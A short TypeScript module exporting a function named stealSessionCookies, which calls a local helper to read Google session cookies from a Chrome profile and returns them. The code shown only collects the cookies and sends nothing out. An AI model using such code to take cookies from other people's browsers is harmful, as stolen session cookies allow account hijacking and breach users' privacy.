import { getGoogleCookies } from "./chrome-cookies.js";

export async function stealSessionCookies(profile?: string) {
  const result = await getGoogleCookies({ profile });
  if (!result) return null;
  return result.cookies;
}
